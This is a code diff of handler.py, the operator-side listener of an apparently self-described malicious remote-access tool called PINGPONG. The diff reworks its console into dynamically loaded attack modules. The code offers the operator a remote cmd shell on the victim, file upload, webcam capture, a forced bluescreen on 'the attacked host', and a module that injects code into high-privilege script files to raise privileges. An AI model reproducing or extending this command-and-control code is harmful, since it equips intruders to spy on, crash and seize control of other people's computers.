@@ -2,12 +2,10 @@
 # @FileName  :handler.py
 # @Time      :2022/11/07 21:23:35
 # @Author    :D0WE1L1N
-import random
 import socket
 # import threading
 import sys
 import main, config_set
-import threading
 import ctypes
 import os
 import inspect
@@ -124,68 +122,40 @@ def startserver(printf, ip='127.0.0.1', port='624', is_input=False, is_auto=True
 		# t = threading.Thread(target=PINGPONG_shell, args=(conn, ip, port, _ip, str(_port), True, AUTORUNSCRIPT, open_ac))
 		# t.start()
 		main.set_config('connect_pool', connect_pool)
-		
-		t = threading.Thread(target=PINGPONG_shell, args=(conn, ip, port, _ip, str(_port), True, Autocommand))
-		t.start()
+		PINGPONG_shell(conn, ip, port, _ip, str(_port), True, Autocommand)
 #连接程序
 def PINGPONG_shell(conn, my_ip, my_port, ip, port, printf, Autocommand):
 	#请求发送函数：检查连接
 	# session_pool = main.get_value('connect_pool')
 	# my_id = session_pool.index([conn, my_ip, my_port, ip, port, 'PINGPONG session']) + 1
-	all_usage = ['cmd', 'upload', 'cam_shot', 'priv_vbp_listen', 'background', 'bluescreen']
+	global addr, my_addr
+	addr = (ip, port)
+	my_addr = (my_ip, int(my_port))
 	import PINGPONG_script.addsend
-	def show_out_usage(list=False, print_out=False):
-		glo = globals()
-		if PINGPONG_script.addsend.App_send("SHOW_ALL_USAGE_APP", False, conn):
-			conn.send(b'OK')
-			amount_of_usage = conn.recv(1024)
-			conn.send(b'OK')
-			i = 0
-			usage_list = []
-			while i < int(amount_of_usage.decode('utf8')):
-				usage = conn.recv(1024)
-				usage_list.append(usage.decode('utf8'))
-				conn.send(b'OK')
-				i += 1
-			if print_out:
-				if list:
-					main.print_normal(f'''PINGPONG>[*]usage : {usage_list}''')
-				else:
-					main.print_normal(''' 
-	---------------------PINGPONG usage---------------------
-	''')
-			id_count = 0
-			usage_list.append('background')
-			usage_id_dst = {}
-			for _usage in all_usage:
-				if _usage in usage_list:
-					id_count += 1
-					usage_id_dst[_usage] = str(id_count)
-					if print_out:
-						main.print_good(f'  {id_count}) {_usage}')
-				else:
-					usage_id_dst[_usage] = None
-			if print_out:
-				main.print_good('   66) help')
-				main.print_good('   99) exit')
-			glo['usage_id_dict'] = usage_id_dst
-	while True:
-		if Autocommand and g_is_auto and Autocommand != '' and Autocommand != ' ':
-			main.print_normal("PINGPONG>[*]running " + Autocommand)
-			command = Autocommand
-			Autocommand = False
+	def basic_choice(var):
+		if var == '33':
+			main.print_normal('PINGPONG[*]>backgrounding session......')
+			if PINGPONG_script.addsend.App_send('BG_APP', False, conn):
+				main.main()
+		elif var == '66':		
+			print_help()
+		elif var == '99':
+			conn.send(bytes("EXIT_APP", 'utf8'))
+			main.print_normal("PINGPONG>[*]PINGPONG session Died, reason: User exit")
+			main.print_normal("handler>[*]Back to main console......")
+			connect_pool = main.get_value('connect_pool')
+			connect_pool.remove([conn, my_ip, my_port, ip, int(port),'PINGPONG session'])
+			main.set_config('connect_pool', connect_pool)
+			conn.close()
+			main.main()
+			stop_thread(t)
+		elif var == 'PING':
+			if PINGPONG_script.addsend.App_send("CHECK_APP", False, conn):
+				main.print_normal("PINGPONG>[*]PONG")
 		else:
-			show_out_usage()
-			command = input("PINGPONG>")
-		#主循环
-		# if is_Auto:
-		#     command = input("PINGPONG>")
-		# else:
-		#     print("PINGPONG>[*]running " + AUTOCOMMAND)
-		#     command = AUTOCOMMAND
-		#     is_Auto = True
-		if command == 'help' or command == 'HELP' or command == '66':
-			main.print_normal("""
+			return True
+	def print_help():
+		main.print_normal("""
 PINGPONG>[*]the PINGPONG shell is a malicious connection and it will start when you use the listener to listen the ip and port which your payload set
 	usage:
 		the usage of the shell is set when you generate the payload
@@ -201,67 +171,92 @@ PINGPONG>[*]the PINGPONG shell is a malicious connection and it will start when 
 			cmd : make a cmd connection
 			upload : upload your file
 			cam_shot : take shot
+			bluescreen : make a bluescreen on the attacked host
 			priv_vbp_listen : when a high-priv file(.vbs .bat .psl) is created, inject code which can make your priv higher""")
-		elif command == 'backdoor_exe' or command == 'BACKDOOR_EXE':
-			pass
-		elif command == 'bg' or command == 'BG' or command == usage_id_dict['background']:
-			main.print_normal('PINGPONG[*]>backgrounding session......')
-			if PINGPONG_script.addsend.App_send('BG_APP', False, conn):
-				main.main()
-		elif command == "cam_shot" or command == "CAM_SHOT" or command == usage_id_dict['cam_shot']:
-			import PINGPONG_script.camera
-			if PINGPONG_script.camera.cam_shot(PINGPONG_script.addsend, conn):
-				try:
-					import cv2      
-					img = cv2.imread('shot.jpg',1)
-					cv2.imshow('imshow',img)
-					cv2.waitKey(0)
-					cv2.destroyAllWindows()
-				except:
-					print("PINGPONG>[*]Failed to open it, You might not installed open-cv, but it doesn't really important")
-		elif command == "exit" or command == "EXIT" or command == '99':
-			conn.send(bytes("EXIT_APP", 'utf8'))
-			main.print_normal("PINGPONG>[*]PINGPONG session Died, reason: User exit")
-			main.print_normal("handler>[*]Back to main console......")
-			connect_pool = main.get_value('connect_pool')
-			connect_pool.remove([conn, my_ip, my_port, ip, int(port),'PINGPONG session'])
-			main.set_config('connect_pool', connect_pool)
-			conn.close()
-			main.main()
-			stop_thread(t)
-		elif command == " " or command == "":
-			continue
-		elif command == 'bluescreen' or command == 'BLUESCREEN' or command == usage_id_dict['bluescreen']:
-			import PINGPONG_script.bluescreen
-			PINGPONG_script.bluescreen.start_attack(conn, my_ip, my_port, ip, port)
-		elif command == "priv_vbp_listen" or command == "PRIV_VBP_LISTEN" or command == usage_id_dict['priv_vbp_listen']:
-			import PINGPONG_script.priv_vbp_listen
-			if PINGPONG_script.priv_vbp_listen.priv_vbp_listen(PINGPONG_script.addsend, conn):
-				conn.close()
-				startserver(False, False, ip=ip, port=port)
-		elif command == 'show_usage' or command == 'SHOW_USAGE':
-			show_out_usage(list=False, print_out=True)
-		elif command == "cmd" or command == "CMD" or command == usage_id_dict['cmd']:
-			import PINGPONG_script.cmdshell
-			if PINGPONG_script.addsend.App_send("CMDSHELL_APP", True, conn):
-				main.print_good("PINGPONG>[+]GOT IT")
-				cmd_port = random.randint(5000, 8000)
-				conn.send(bytes(str(cmd_port), "utf8"))
-				conn.recv(1024)
-				PINGPONG_script.cmdshell.start(my_ip, cmd_port, conn, my_port, _main_port=port)
-		elif command == "upload" or command == "UPLOAD" or command == usage_id_dict['upload']:
-			import PINGPONG_script.upload
-			if PINGPONG_script.addsend.App_send('UPLOAD_APP', False, conn):
-				file_dir = input("PINGPONG>[*]Please input the location of the file in your host>")
-				to_dir = input("PINGPONG>[*]Please input the location of the file where you uploaded>")
-				PINGPONG_script.upload.Upload(ip, file_dir, to_dir, True, True, conn, PINGPONG_script.addsend)
-		elif command == "info" or command == "INFO":
-			main.print_normal("PINGPONG>[*]Connection: " + my_ip + ":" + str(my_port) + " >>> " + ip + ":" + str(port))
-		elif command == "ping" or command == "PING":
-			if PINGPONG_script.addsend.App_send("CHECK_APP", False, conn):
-				main.print_normal("PINGPONG>[*]PONG")
+		
+	def ask_for_choice(list=False, print_out=True):
+		if PINGPONG_script.addsend.App_send("SHOW_ALL_USAGE_APP", False, conn):
+			all_mod_usage_dict = {}
+			mods = []
+			script_path = os.path.dirname(os.path.abspath(__file__))
+			for mod in os.listdir('./PINGPONG_script'):
+				if os.path.isdir(os.path.join(script_path, 'PINGPONG_script', mod)) and mod != "__pycache__":
+					mods.append(mod)
+					scripts = []
+					for scr in os.listdir(f'./PINGPONG_script/{mod}'):
+						usage = os.path.splitext(scr)[0]
+						scripts.append(usage)
+					all_mod_usage_dict[mod] = scripts
+			conn.send(b'OK')
+			amount_of_usage = conn.recv(1024)
+			conn.send(b'OK')
+			i = 0
+			usage_list = []
+			while i < int(amount_of_usage.decode('utf8')):
+				usage = conn.recv(1024)
+				usage_list.append(usage.decode('utf8'))
+				conn.send(b'OK')
+				i += 1
+			all_usage = []
+			for tmp in all_mod_usage_dict.keys():
+				all_usage += tmp
+			if print_out:
+				if list:
+					main.print_normal(f'''PINGPONG>[*]usage : {usage_list}''')
+				else:
+					main.print_normal("PINGPONG>[*]Connection: " + my_ip + ":" + str(my_port) + " >>> " + ip + ":" + str(port))
+					main.print_normal(''' 
+	---------------------PINGPONG usage---------------------
+	''')
+				id_count = 0
+				mod_id_dst = {}
+				for _mod in mods:
+					id_count += 1
+					if print_out:
+						main.print_good(f'	{str(id_count)}) {_mod}')
+						mod_id_dst[str(id_count)] = _mod
+				if print_out:
+					main.print_good('	33) background')
+					main.print_good('   	66) help')
+					main.print_good('   	99) exit')
+				mod_choice = input('PINGPONG>')
+				def load_mod(_mod_choice, conn, addr, my_addr):
+					modl = mod_id_dst[_mod_choice]
+					mod_usage_list = []
+					for usage in usage_list:
+						if usage in all_mod_usage_dict[modl]:
+							mod_usage_list.append(usage)
+					if mod_usage_list == []:
+						main.print_error('PINGPONG>[-]This payload does not have activate usage in this mod')
+						ask_for_choice(print_out=False)
+						return True
+					id_count = 0
+					script_id_dst = {}
+					for _usage in mod_usage_list:
+						id_count += 1
+						main.print_good(f'  	{id_count}) {_usage}')
+						script_id_dst[id_count] = _usage
+					main.print_good(f'	99) back')
+					script_choice = input("PINGPONG>")
+					try:
+						script_choice = int(script_choice)
+					except:
+						main.print_error("PINGPONG>[-]No such choice")
+					if script_choice in [i for i in range(1, id_count)]:
+						script = script_id_dst[script_choice]
+						exec(f'import PINGPONG_script.{modl}.{script}')
+						exec(f'PINGPONG_script.{modl}.{script}.run(conn, addr, my_addr)')
+					elif script_choice == 99:
+						ask_for_choice()
+				if basic_choice(mod_choice):
+					load_mod(mod_choice, conn, addr, my_addr)
+	while True:
+		if Autocommand and g_is_auto and Autocommand != '' and Autocommand != ' ':
+			main.print_normal("PINGPONG>[*]running " + Autocommand)
+			command = Autocommand
+			Autocommand = False
 		else:
-			main.print_error("PINGPONG>[-]Command " + command + " not found")                 
+			ask_for_choice()               
 def load_config(config_list, d):
 	local_var = globals()
 	for con in config_list:
